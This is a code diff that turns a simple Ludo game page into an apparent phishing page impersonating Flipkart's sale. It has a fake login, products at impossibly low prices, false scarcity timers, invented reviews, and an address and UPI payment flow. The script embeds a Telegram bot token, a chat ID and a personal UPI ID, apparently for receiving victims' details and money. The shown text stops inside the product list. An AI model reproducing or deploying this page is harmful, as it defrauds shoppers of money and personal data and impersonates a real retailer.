@@ -1,18 +1,332 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Ludo Game</title>
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Flipkart | Big Billion Days Sale</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; user-select: none; }
+        .fk-blue { background-color: #2874f0; }
+        .btn-yellow { background: #ff9f00; color: #212121; font-weight: 500; }
+        .btn-orange { background: #fb641b; color: #fff; font-weight: 500; }
+        .hidden { display: none !important; }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        
+        /* Slider & Dots */
+        .slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; background: #fff; height: 380px; position: relative; }
+        .slider img { min-width: 100%; scroll-snap-align: start; object-fit: contain; padding: 20px; }
+        
+        /* Skeleton Animation */
+        .skeleton { background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%); background-size: 200% 100%; animation: loading 1.5s infinite; }
+        @keyframes loading { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+
+        /* Input Styling */
+        input:focus { border-color: #2874f0; }
+        .loading-text { color: #2874f0; font-size: 10px; font-weight: bold; }
+    </style>
 </head>
 <body>
-  <div id="board"></div>
-  <div id="controls">
-    <button id="rollDice">Roll Dice</button>
-    <div id="dice">Dice: 0</div>
-    <div id="currentPlayer">Current Player: Red</div>
-  </div>
-  <script src="/socket.io/socket.io.js"></script>
-  <script src="script.js"></script>
+
+    <div id="skeleton-loader" class="p-4 space-y-4 bg-white min-h-screen">
+        <div class="h-10 w-full skeleton rounded"></div>
+        <div class="h-44 w-full skeleton rounded"></div>
+        <div class="grid grid-cols-2 gap-4"><div class="h-40 skeleton rounded"></div><div class="h-40 skeleton rounded"></div></div>
+    </div>
+
+    <div id="main-app" class="hidden">
+        
+        <header class="fk-blue p-3 flex items-center justify-between sticky top-0 z-50 shadow-md">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-bars text-white"></i>
+                <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-5">
+            </div>
+            <div class="flex gap-4 text-white items-center">
+                <div class="text-[10px] font-bold"><i class="fa-solid fa-coins text-yellow-400"></i> 240</div>
+                <i class="fa-solid fa-cart-shopping"></i>
+            </div>
+        </header>
+
+        <div id="page-login" class="bg-white min-h-screen">
+            <div class="fk-blue p-10 text-white">
+                <h2 class="text-2xl font-bold">Login</h2>
+                <p class="text-sm mt-2 opacity-80">Get access to your Orders, Wishlist and Recommendations</p>
+            </div>
+            <div class="p-6 space-y-6">
+                <div class="relative">
+                    <input type="tel" id="loginPhone" maxlength="10" class="w-full border-b-2 border-gray-300 p-2 outline-none text-lg focus:border-blue-600 transition-all peer" placeholder=" ">
+                    <label class="absolute left-2 top-2 text-gray-400 pointer-events-none transition-all peer-focus:-top-4 peer-focus:text-xs peer-focus:text-blue-600">Enter Phone Number</label>
+                </div>
+                <p class="text-[11px] text-gray-500">By continuing, you agree to Flipkart's Terms of Use and Privacy Policy.</p>
+                <button onclick="showPage('page-home')" class="w-full btn-orange py-3 font-bold shadow-lg">CONTINUE</button>
+            </div>
+        </div>
+
+        <div id="page-home" class="hidden pb-20">
+            <div class="fk-blue px-3 pb-3"><div class="bg-white p-2 rounded-sm flex items-center gap-2 text-gray-400 text-sm"><i class="fa-solid fa-magnifying-glass"></i><span>Search for products...</span></div></div>
+            <div class="bg-white flex overflow-x-auto p-3 no-scrollbar gap-6 border-b">
+                <div class="text-center min-w-[65px]"><img src="https://rukminim1.flixcart.com/flap/128/128/image/22fddf3c7da4c4f4.png" class="h-10 mx-auto"><span class="text-[10px] mt-1 block">Mobiles</span></div>
+                <div class="text-center min-w-[65px]"><img src="https://rukminim1.flixcart.com/flap/128/128/image/69cff46147ea8f44.png" class="h-10 mx-auto"><span class="text-[10px] mt-1 block">Electronics</span></div>
+                <div class="text-center min-w-[65px]"><img src="https://rukminim1.flixcart.com/flap/128/128/image/ab7e2c021f9b4c57.png" class="h-10 mx-auto"><span class="text-[10px] mt-1 block">Home</span></div>
+            </div>
+            <img src="https://rukminim1.flixcart.com/fk-p-flap/1600/270/image/33792015df3e573a.jpg" class="w-full h-40 object-cover mt-1">
+            <div class="p-2 grid grid-cols-2 gap-2" id="home-grid"></div>
+        </div>
+
+        <div id="page-detail" class="hidden fixed inset-0 bg-white z-[100] overflow-y-auto pb-16">
+            <nav class="sticky top-0 bg-white border-b p-3 flex justify-between items-center z-50">
+                <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
+                <div class="flex gap-4 text-gray-500"><i class="fa-solid fa-heart" onclick="this.classList.toggle('text-red-600')"></i><i class="fa-solid fa-cart-shopping"></i></div>
+            </nav>
+
+            <div class="slider no-scrollbar" id="d-slider"></div>
+
+            <div class="p-4 bg-white">
+                <h1 id="d-title" class="text-sm font-normal text-gray-800 leading-tight"></h1>
+                <div class="flex justify-between items-center mt-3">
+                    <span class="text-[11px] text-red-600 font-bold bg-red-50 px-2 py-1 rounded">Offer ends in <span id="timer">10:00</span></span>
+                    <span class="text-[11px] text-orange-600 font-bold">Only 2 left!</span>
+                </div>
+                <div class="mt-3 flex items-center gap-2">
+                    <span class="bg-green-700 text-white text-[10px] px-1.5 py-0.5 rounded font-bold">4.4 ★</span>
+                    <span class="text-gray-400 text-[11px]">82,401 Ratings</span>
+                    <img src="https://static-assets-web.flixcart.com/batman-returns/static/content/imgs/fa_62673a.png" class="h-4 ml-auto">
+                </div>
+                <div class="mt-3 flex items-baseline gap-2">
+                    <span id="d-price" class="text-2xl font-bold"></span>
+                    <span class="text-gray-500 line-through text-xs">₹49,999</span>
+                    <span class="text-green-600 font-bold text-sm">92% off</span>
+                </div>
+                <p class="text-[11px] text-green-700 font-bold mt-2"><i class="fa-solid fa-truck-fast"></i> Delivery by Tomorrow | <span class="line-through text-gray-400">₹40</span> FREE</p>
+            </div>
+
+            <div class="h-2 bg-gray-100 border-y"></div>
+
+            <div class="p-4 bg-white">
+                <h3 class="text-[11px] font-bold text-gray-400 uppercase mb-4 tracking-widest">Product Details</h3>
+                <div id="full-image-list" class="space-y-4"></div>
+            </div>
+
+            <div class="h-2 bg-gray-100 border-y"></div>
+
+            <div class="p-4 bg-white">
+                <h3 class="font-bold text-sm mb-4">Ratings & Reviews</h3>
+                <div class="space-y-4">
+                    <div class="border-b pb-3">
+                        <div class="flex gap-2 items-center"><span class="bg-green-700 text-white text-[10px] px-1 rounded">5 ★</span><span class="text-xs font-bold">Terrific Purchase</span></div>
+                        <p class="text-xs text-gray-600 mt-1">Value for money. Best in this segment. Camera is also good.</p>
+                        <p class="text-[10px] text-gray-400 mt-2">Verified Buyer, Mumbai • 2 days ago</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-50">
+                <button class="w-1/2 font-bold text-gray-700 text-sm">ADD TO CART</button>
+                <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold uppercase text-sm">Buy Now</button>
+            </div>
+        </div>
+
+        <div id="page-address" class="hidden fixed inset-0 bg-[#f1f3f6] z-[200] overflow-y-auto pb-20">
+            <header class="fk-blue p-4 text-white flex items-center gap-4 sticky top-0 shadow-md">
+                <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
+                <span class="font-medium text-lg">Add Address</span>
+            </header>
+            <div class="p-3">
+                <div class="bg-white p-5 rounded-sm space-y-6">
+                    <input type="text" id="uName" placeholder="Full Name*" class="w-full border-b p-2 outline-none text-sm">
+                    <input type="tel" id="uPhone" placeholder="Phone Number*" class="w-full border-b p-2 outline-none text-sm">
+                    
+                    <div class="flex gap-4">
+                        <div class="w-1/2 relative">
+                            <input type="tel" id="uPin" oninput="fetchPincode(this.value)" placeholder="Pincode*" class="w-full border-b p-2 outline-none text-sm">
+                            <span id="pin-loader" class="absolute right-0 top-2 hidden loading-text">Searching...</span>
+                        </div>
+                        <input type="text" id="uCity" placeholder="City*" class="w-1/2 border-b p-2 outline-none text-sm bg-gray-50" readonly>
+                    </div>
+                    
+                    <input type="text" id="uState" placeholder="State*" class="w-full border-b p-2 outline-none text-sm bg-gray-50" readonly>
+                    <input type="text" id="uAdd" placeholder="House No, Road Name*" class="w-full border-b p-2 outline-none text-sm">
+                    
+                    <div class="flex gap-4">
+                        <button class="px-6 py-1.5 border rounded-full text-xs bg-blue-50 border-blue-600 text-blue-600 font-bold">Home</button>
+                        <button class="px-6 py-1.5 border rounded-full text-xs">Work</button>
+                    </div>
+                    <button onclick="showReceipt()" class="w-full btn-orange py-4 rounded-sm font-bold uppercase text-sm shadow-xl">Deliver to this Address</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="page-receipt" class="hidden fixed inset-0 bg-[#f1f3f6] z-[300] overflow-y-auto pb-20">
+            <header class="bg-white p-4 flex items-center gap-4 border-b">
+                <i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i>
+                <span class="font-medium">Price Details</span>
+            </header>
+            <div class="bg-white p-4 mt-2 flex gap-4">
+                <img id="r-img" class="h-20 w-20 object-contain border p-1 rounded">
+                <div>
+                    <p id="r-name" class="text-sm font-medium line-clamp-1 text-gray-700"></p>
+                    <p class="font-bold text-lg mt-1" id="r-price"></p>
+                    <p class="text-[11px] text-green-600 font-bold">FREE Delivery</p>
+                </div>
+            </div>
+            <div class="bg-white p-4 mt-2 space-y-4">
+                <div class="flex justify-between text-sm"><span>Price (1 item)</span><span>₹49,999</span></div>
+                <div class="flex justify-between text-sm text-green-600"><span>Discount</span><span id="r-disc"></span></div>
+                <div class="border-t border-dashed pt-4 flex justify-between font-bold text-xl"><span>Total Amount</span><span id="r-total"></span></div>
+            </div>
+            <div class="fixed bottom-0 w-full bg-white p-3 flex justify-between items-center border-t shadow-2xl">
+                <div id="ft-total" class="font-bold text-lg"></div>
+                <button onclick="showPage('page-payment')" class="btn-orange px-10 py-3 rounded-sm font-bold uppercase text-sm">Proceed</button>
+            </div>
+        </div>
+
+        <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400]">
+            <header class="fk-blue p-4 text-white flex items-center gap-4"><i class="fa-solid fa-arrow-left" onclick="showPage('page-receipt')"></i><span class="font-medium">Payments</span></header>
+            <div class="p-4 mt-2">
+                <div onclick="finalPay()" class="bg-white p-5 border-2 border-blue-600 rounded flex justify-between items-center shadow-lg">
+                    <div class="flex items-center gap-4"><img src="https://img.icons8.com/color/48/phone-pe.png" class="h-7"><span class="font-bold">UPI (PhonePe / GPay)</span></div>
+                    <div class="h-6 w-6 rounded-full border-[6px] border-blue-600"></div>
+                </div>
+                <button onclick="finalPay()" class="w-full btn-orange py-4 mt-10 rounded-sm font-bold text-lg shadow-2xl">PAY NOW</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
+        const CHAT_ID = "1981500395";
+        const MY_UPI = "john.sa@ptyes";
+
+        const products = [
+            { id: 1, name: "boAt Airdopes Supreme w/ 4 Mics AI ENx Tech, 50 HRS Playback,Multi Point Connectivity Bluetooth (Sporty Blue, True Wireless)", price: "99", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/8/2/m/-original-imagz5z5jshnhvrp.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/d/n/o/-original-imahfe3khgyywbtu.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/x/n/-original-imahfe3kddxufwnw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/x/h/i/-original-imahfe3k6ycg8erk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/0/y/-original-imahfe3kzwe69mcv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/n/c/w/-original-imahfe3k8jyzw33z.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/6/l/-original-imahfe3kzj7whsgg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/r/x/-original-imahfe3kgz9hywmh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/i/a/-original-imahfe3kgqzta448.jpeg?q=70&crop=false"] },
+            { id: 2, name: "Newturn MAXSON Mid back Work from home/Office/study/desk(WFH) Leather Office Adjustable Arm Chair (Brown, Optional Installation Available)", price: "499", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/0/b/u/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxcnzfjxpty.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/x/d/w/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxc2hjhvzht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/m/c/w/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxcczhszbus.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/y/b/2/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxcpddf6heb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/t/h/r/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxcnhxbjhkg.jpeg?q=70&crop=false"] },
+            { id: 3, name: "FD Furnituredeal Leather Office Chair, PU Home Computer Desk Chairs with Ergonomic Back Support Leatherette Office Adjustable Arm Chair (Black, Optional Installation Available)", price: "499", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/k/8/e/1-leatherette-51-01-mb-chair-new-black-fd-furnituredeal-106-original-imahe4r8htfhmzsm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/j/g/4/1-leatherette-51-01-mb-chair-new-black-fd-furnituredeal-106-original-imahe4r8utmsxrcg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/p/g/g/1-leatherette-51-01-mb-chair-new-black-fd-furnituredeal-106-original-imahe4r82z8yfghk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/r/q/7/1-leatherette-51-01-mb-chair-new-black-fd-furnituredeal-106-original-imahe4r8frqfeydm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/0/l/y/1-leatherette-51-01-mb-chair-new-black-fd-furnituredeal-106-original-imahe4r8fdyzhq4j.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/y/2/x/1-leatherette-51-01-mb-chair-new-black-fd-furnituredeal-106-original-imahe4r86w7qgytu.jpeg?q=70&crop=false"] },
+            { id: 4, name: "vivo T4x 5G (Marine Blue, 128 GB) (6 GB RAM)", price: "599", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/m/n/v/-original-imahavdveeghweea.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/r/7/f/-original-imahavdvncunbngw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/l/u/m/-original-imah9ytqhf7yh7dg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/h/j/r/-original-imah9ytqnepburjq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/7/l/h/-original-imah9ytqzs4uegzn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/j/x/a/-original-imah9ytqnm4ap4kg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/x/n/0/-original-imaha77vvuva8rbu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/l/x/e/-original-imah9ytqqcsycyhp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/l/2/h/-original-imaha77vnee447ys.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/w/v/g/-original-imah9ytqhewypshd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/e/t/6/-original-imah9ytqkdy2fq4n.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/o/e/m/-original-imah9ytqzm7zvugx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/i/s/w/-original-imah9ytq8c3vqfud.jpeg?q=70&crop=false"] },
+            { id: 5, name: "GOBOULT Mustang Torq 60Hrs, App Support, 4Mic ENC, Breathable LED, 5.4v Bluetooth (Torq, True Wireless)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/h/k/-original-imahe5gmzuxjnxqd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/7/k/i/-original-imahe5gmx9u2gwyg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/z/f/5/-original-imahe5gmrmdvfgm5.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/r/z/-original-imahe5gmmvuhwvmt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/2/h/d/-original-imahe5gmehvhrbfk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/o/y/j/-original-imahe5gmnsd47jbe.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/u/a/-original-imahe5gmzdfhpnyh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/f/z/-original-imahe5gmxzfcabht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/8/m/q/-original-imahe5gmpp9vu8yx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/8/l/f/-original-imahe5gmgzjjgbgf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/k/p/u/-original-imahe5gmfym99yxj.jpeg?q=70&crop=false"] },
+            { id: 6, name: "Google Pixel 9A (Obsidian, 256 GB) (8 GB RAM)", price: "599", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/x/b/u/-original-imahadxg2fazkzub.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/x/l/a/pixel-9a-ga09566-in-google-original-imahaevqctvk94ma.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/d/p/s/-original-imahaew3pg9qsffn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/a/y/f/-original-imahaew3epbzkyhq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/j/z/a/-original-imahaew3tmbz8ez7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/y/m/b/-original-imahaew3ehhh8uuz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/t/l/8/-original-imahaew3bnkmzzzm.jpeg?q=70&crop=false"] },
+            { id: 7, name: "Apple iPhone 16 (White, 128 GB)", price: "699", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/h/u/i/-original-imahgfmyczqxhtm2.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/9/y/5/-original-imahfvx3frctnyej.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/m/g/x/-original-imahfvx3vtgphzga.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/b/k/1/-original-imahfvx3yzjcyufw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/j/o/f/-original-imahfvx3gfzzy2uk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/r/b/x/-original-imahfvx3khzd8e4u.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/d/o/r/-original-imahfvx3ywpmyexy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/z/7/m/-original-imahfvx3tzcgbefg.jpeg?q=70&crop=false"] },
+            { id: 8, name: "Apple iPhone 14 (Blue, 128 GB)", price: "799", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/3/5/l/-original-imaghx9qmgqsk9s4.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/5/w/3/-original-imaghxcpnf8aay8h.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/n/b/z/-original-imaghxcpwuhbghgh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/5/i/7/-original-imaguypzzhbzm5an.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/e/f/h/-original-imaguypztg4ddpes.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/a/q/n/-original-imagh2gw4zqxyzst.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/1/d/y/-original-imaghxcpvtta2hzs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/q/b/i/-original-imaghxcptg5mdycw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/n/t/g/-original-imaghxcp4ctcfwff.jpeg?q=70&crop=false"] },
+            { id: 9, name: "realme Buds Wireless 2 with Dart Charge and Active Noise Cancellation (ANC) Bluetooth Gaming (Grey, In the Ear)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/krayqa80/headphone/v/k/q/rma2009-realme-original-imag54f5hsazzk99.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krayqa80/headphone/d/z/m/rma2009-realme-original-imag54f5hxeufhyj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krwec280/headphone/v/u/v/rma2009-realme-original-imag5hg8vgzemazk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krgohow0/headphone/l/c/2/rma2009-realme-original-imag58xtr8eyzpzu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krgohow0/headphone/g/m/s/rma2009-realme-original-imag58xth2f2dgah.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krgohow0/headphone/x/j/b/rma2009-realme-original-imag58xtzsgz5c96.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krgohow0/headphone/n/f/m/rma2009-realme-original-imag58xt3kdwfkye.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krgohow0/headphone/l/y/b/rma2009-realme-original-imag58xtux9eggze.jpeg?q=70&crop=false"] },
+            { id: 10, name: "Apple iPhone 17 Pro (Deep Blue, 256 GB)", price: "799", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/5/i/n/-original-imahft5ndwfkx6ez.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/q/s/s/-original-imahft5nxa9wukz8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/c/k/m/-original-imahft5nz2k5gfm3.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/a/p/v/-original-imahft5nch3khzvu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/x/c/q/-original-imahft5njwbfyz5u.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/q/m/5/-original-imahft5nh6hqzt4g.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/g/b/g/-original-imahft5nwvbwaasy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/e/i/-original-imahft5nerqtntdt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/p/o/c/-original-imahft5nzmgz2agc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/n/a/n/-original-imahft5nq7z4bnmn.jpeg?q=70&crop=false"] },
+            { id: 11, name: "Samsung Galaxy Z Flip7 5G (Blue Shadow, 512 GB) (12 GB RAM)", price: "1199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/7/9/2/-original-imahgfmzfxmapecm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/u/h/h/-original-imahggetz2vdzvst.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/s/o/l/-original-imahggetvcsv5hxa.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/s/z/i/-original-imahggetxdmxcfkn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/z/g/0/-original-imahggethene57ya.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/2/z/3/-original-imahggetvttzwnc8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/t/e/x/-original-imahggeua7r7f8gm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/r/b/y/-original-imahggeubrqhzvft.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/b/w/b/-original-imahggeuhhcxx6g5.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/t/y/b/-original-imahggeuknn9gegx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/j/8/4/-original-imahggeufzq73atm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/8/x/f/-original-imahggeuggtg2rup.jpeg?q=70&crop=false"] },
+            { id: 12, name: "OnePlus Bullets Wireless Z2 Bluetooth (Acoustic Red, In the Ear)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/i/p/4/e305a-e305b-oneplus-original-imahe6hbbfhhtycy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/f/c/e305a-e305b-oneplus-original-imahe6hgey5mzpqs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/n/x/e305a-e305b-oneplus-original-imahe6hbhbzwqayj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/0/j/e305a-e305b-oneplus-original-imahe6hbhftpmwem.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/q/h/e305a-e305b-oneplus-original-imahe6hbgap6d22z.jpeg?q=70&crop=false"] },
+            { id: 13, name: "OnePlus Nord Buds 3r TWS Earbud, 10min charge for 8hr Music, 3D Audio, 2-mic call Bluetooth (Ash Black, True Wireless)", price: "99", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/7/n/o/-original-imahfsg7chmgrugu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/q/2/-original-imahfsg7qtke8kpf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/t/v/-original-imahfsg7g6g8sach.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/c/p/v/-original-imahf9dazdk6sqxd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/m/y/x/-original-imahf9daqcftfrzm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/d/f/o/-original-imahf9dafdggz4yu.jpeg?q=70&crop=false"] },
